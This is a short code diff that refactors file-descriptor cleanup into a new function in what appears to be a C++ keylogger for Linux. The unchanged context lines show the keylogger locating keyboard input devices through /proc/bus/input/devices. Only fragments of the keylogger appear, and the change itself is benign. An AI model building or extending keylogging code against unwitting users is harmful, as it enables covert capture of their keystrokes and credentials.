@@ -97,6 +97,12 @@ void sig_handler(int sig_num) {
   must_stop = 1;
 }
 
+void cleanup_ctx(struct keylogger_ctx *ctx) {
+  for (auto &fd : ctx->kb_fds) {
+    close(fd);
+  }
+}
+
 std::vector<std::string> get_event_files() {
   std::ifstream file{"/proc/bus/input/devices"};
   std::regex kb_regex{"H: Handlers=sysrq kbd (.+?) leds"};
@@ -248,10 +254,6 @@ int run(struct keylogger_ctx *ctx) {
     }
   }
 
-  for (auto &fd : ctx->kb_fds) {
-    close(fd);
-  }
-
   return EXIT_SUCCESS;
 }
 
@@ -265,6 +267,7 @@ int main() {
   std::signal(SIGINT, sig_handler);
 
   int ret = run(&ctx);
+  cleanup_ctx(&ctx);
 
   std::exit(ret);
 }
